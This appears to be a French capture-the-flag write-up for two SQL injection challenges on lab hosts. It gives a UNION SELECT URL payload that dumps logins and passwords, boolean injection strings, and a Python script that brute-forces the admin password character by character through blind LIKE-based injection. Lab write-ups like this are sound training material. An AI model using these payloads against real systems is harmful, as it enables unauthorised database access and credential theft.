## CHAL1
1. SqlMap pour voir le nom des tables.
2. Taper cette requette:

* ```http://10.33.3.14:8081/?article=%27UNION%20Select%20null,login,password%20from%20users;```

## CHAL2
1. ```' or 1=1```
2. On essayer de trouver la longueur du login:
* ```' or 1=1 AND length(login) < 6 --```

3. J'ai appris que le Login faisais 5 characteres.
4. Le login est `admin`
5. On va essayer de trouver la longueur du password:
* ```' or 1=1 AND length(password) < 56 --```
6. Réalisation d'un script pour brut force:
```
import requests
import hashlib
import string
from itertools import chain, product


headers = {'User-Agent': 'Mozilla/5.0'}
url = 'http://10.33.3.14:8082/'

cond = "Error Wrong credentials"
compteur = 0
i = 0
mdp = ""
tab = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789-_'
test =""

for i in range(55):
    data = f"admin' and password LIKE 'b%';--"
    payload = {'login':data, 'password': data}
    session = requests.Session()
    r = session.post(url,headers=headers,data=payload)
    while cond in r.text:
        test = tab[compteur]
        data2 = f"admin' and password LIKE '{mdp}{test}%';--"
        payload = {'login':data2, 'password': data2}
        session = requests.Session()
        r = session.post(url,headers=headers,data=payload)
        compteur+=1
        print(data2)
        
        
    if "Felicitation le mot de passe de l'admin est le flag" in r.text:
        mdp += test
        i+=1
        compteur = 0
        
print(mdp)
```
7. Password = ```_fl4g_ocnc2smpstbzddxoqgim1ivweqyto5-uvbkcmuqkgrm9bockz ```
